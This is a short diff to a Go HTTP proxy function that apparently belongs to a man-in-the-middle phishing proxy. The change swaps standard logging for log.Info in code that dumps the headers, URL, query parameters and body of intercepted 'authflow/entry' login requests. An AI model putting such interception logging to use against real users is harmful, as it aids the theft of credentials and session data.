@@ -236,25 +236,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		        }
 			//Dumping the request
 			if strings.Contains(req.URL.Path, "authflow/entry") && (req.Method == http.MethodGet) {
-			    log.Println("Intercepted a GET request to authflow/entry")
+			    log.Info("Intercepted a GET request to authflow/entry")
 			
 			    // Log request headers
-			    log.Println("Headers:")
+			    log.Info("Headers:")
 			    for key, values := range req.Header {
 				for _, value := range values {
-				    log.Printf("%s: %s\n", key, value)
+				    log.Info(fmt.Sprintf("%s: %s", key, value))
 				}
 			    }
 			
 			    // Log request URL
-			    log.Printf("URL: %s\n", req.URL.String())
+			    log.Info(fmt.Sprintf("URL: %s", req.URL.String()))
 			
 			    // Log query parameters
 			    if len(req.URL.Query()) > 0 {
-				log.Println("Query Parameters:")
+				log.Info("Query Parameters:")
 				for key, values := range req.URL.Query() {
 				    for _, value := range values {
-					log.Printf("%s: %s\n", key, value)
+					log.Info(fmt.Sprintf("%s: %s", key, value))
 				    }
 				}
 			    }
@@ -263,11 +263,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			    bodyBytes, err := ioutil.ReadAll(req.Body)
 			    if err == nil && len(bodyBytes) > 0 {
 				req.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes)) // Restore body for downstream
-				log.Printf("Body: %s\n", string(bodyBytes))
+				log.Info(fmt.Sprintf("Body: %s", string(bodyBytes)))
 			    } else {
-				log.Println("No body found in the request.")
+				log.Info("No body found in the request.")
 			    }
 			}
+
 
 
 
